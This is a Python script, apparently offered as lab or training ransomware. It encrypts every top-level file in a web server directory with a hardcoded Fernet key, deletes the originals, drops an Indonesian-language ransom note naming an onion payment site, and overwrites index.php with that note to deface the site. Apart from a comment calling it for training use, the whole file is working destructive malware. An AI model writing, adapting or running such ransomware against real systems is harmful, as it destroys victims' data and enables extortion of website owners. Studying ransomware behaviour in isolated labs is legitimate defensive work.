#!/usr/bin/env python3
# gem.py
# TRAINING / LAB USE ONLY - uses known key so you can decrypt later

import os
from cryptography.fernet import Fernet

# === THIS KEY IS KNOWN - ONLY FOR TRAINING ===
key = b'MTIzNDU2NzgxMjM0NTY3ODEyMzQ1Njc4MTIzNDU2Nzg=' 
cipher = Fernet(key.decode('utf-8'))

TARGET_DIR = "/var/www/html/csirt/public"
EXTENSION = ".gembok"   # change to whatever your ransomware family uses

# Drop a scary ransom note right in the folder
ransom_note = """
<!DOCTYPE html>
<html><body style="background:black;color:red;text-align:center;font-size:3em;">
<h1>♠ DATA ANDA TERENKRIPSI! ♠</h1>
<p>Website anda kenak .gembok</p>
<p>Yuk bayar kuncinya di onion site kami :)
http://xb6q2aggycmlcrjtbjendcnnwpmmwbosqaugxsqbracujntika2us.onion/contact</p>
</body></html>
"""

with open(os.path.join(TARGET_DIR, "GEMBOK-README.html"), "w") as f:
    f.write(ransom_note)

# Encrypt ONLY files in the top level (no recursion)
encrypted_count = 0
for entry in os.listdir(TARGET_DIR):
    full_path = os.path.join(TARGET_DIR, entry)

    # Skip directories completely
    if os.path.isdir(full_path):
        print(f"[+] Skipping directory: {entry}")
        continue

    # Skip if it's already encrypted or the ransom note
    if entry.endswith(EXTENSION) or entry.startswith("GEMBOK-"):
        continue

    # Skip if it's this script itself (safety)
    if entry.endswith("gem.py"):
        continue

    try:
        with open(full_path, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        enc_path = full_path + EXTENSION
        with open(enc_path, "wb") as f:
            f.write(encrypted)
        os.remove(full_path)
        print(f"[+] Encrypted: {entry} → {entry}{EXTENSION}")
        encrypted_count += 1
    except Exception as e:
        print(f"[-] Failed on {entry}: {e}")

with open(os.path.join(TARGET_DIR, "index.php"), "w") as f:
    f.write(ransom_note)
